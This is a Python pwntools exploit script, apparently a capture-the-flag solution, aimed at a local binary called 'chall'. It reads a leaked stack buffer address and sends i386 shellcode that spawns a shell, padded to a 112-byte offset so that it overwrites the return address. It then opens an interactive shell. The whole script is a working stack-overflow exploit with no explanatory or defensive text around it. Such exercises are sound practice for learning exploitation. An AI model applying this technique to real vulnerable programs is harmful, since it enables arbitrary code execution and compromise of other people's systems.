#!/usr/bin/python3
#-*-coding:utf-8-*-

from pwn import *


target = process('./chall')
# target = process('./chall_2')

# address
_ = target.readuntil("buf = ") 
buf_addr = int(target.readline(), 16)
print("buf addr : 0x{:x}".format(buf_addr))


# shellcode
shellcode = asm(pwnlib.shellcraft.i386.linux.sh())

# payload
payload = shellcode
payload += b"A" * (112 - len(payload))
payload += p32(buf_addr)


target.sendline(payload)

target.interactive()
    

